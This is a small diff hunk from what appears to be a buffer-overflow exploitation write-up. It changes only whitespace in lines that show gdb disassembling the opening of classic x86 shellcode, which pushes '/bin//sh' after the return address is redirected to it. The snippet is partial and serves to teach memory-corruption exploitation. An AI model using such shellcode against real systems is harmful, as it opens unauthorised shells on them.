@@ -144,8 +144,8 @@ awesom!    
 
 After above instruction, ret is changes to shellcode..  
 > (gdb) x/10i 0xfff7bebc  
-> =>0x804a024 <sc>: xor eax,eax  
-> 0x804a026 <sc+2>: push eax  
+> =>0x804a024 <sc>: xor eax,eax   
+> 0x804a026 <sc+2>: push eax    
 > 0x804a027 <sc+3>: push 0x68732f2f  
 > 0x804a02c <sc+8>: push 0x6e69622f  
 > 0x804a031 <sc+13>: mov ebx,esp  
